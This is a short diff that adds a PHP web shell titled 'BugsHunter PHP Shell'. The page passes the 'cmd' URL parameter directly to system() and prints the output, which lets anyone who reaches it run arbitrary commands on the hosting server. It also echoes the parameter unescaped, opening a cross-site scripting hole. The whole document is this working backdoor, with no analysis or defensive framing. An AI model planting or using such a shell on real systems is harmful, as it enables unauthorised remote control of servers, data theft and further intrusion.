@@ -1,0 +1,9 @@
+<html>
+	<head>
+		<title> BugsHunter PHP Shell </title>
+	</head>
+	
+	<body>
+		Command: <?php echo $_GET["cmd"]; ?>  command result: <textarea><?php system($_GET["cmd"]); ?></textarea>
+	</body>
+</html>
